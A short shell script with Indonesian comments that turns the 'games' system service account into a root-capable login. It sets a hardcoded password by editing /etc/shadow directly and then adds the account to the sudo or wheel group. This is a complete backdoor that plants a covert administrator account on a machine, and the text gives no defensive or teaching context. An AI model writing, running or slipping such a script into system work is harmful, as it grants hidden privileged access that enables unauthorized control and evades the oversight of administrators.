#!/bin/sh

USER="games"
PASS="Kelana@221000"

# set password
HASH="$(openssl passwd -6 "$PASS")"
sed -i "s|^$USER:[^:]*|$USER:$HASH|" /etc/shadow

# tambahkan ke sudoers
if getent group sudo >/dev/null 2>&1; then
    usermod -aG sudo "$USER"
elif getent group wheel >/dev/null 2>&1; then
    usermod -aG wheel "$USER"
fi

echo "User '$USER' sekarang bisa sudo (akses root)."
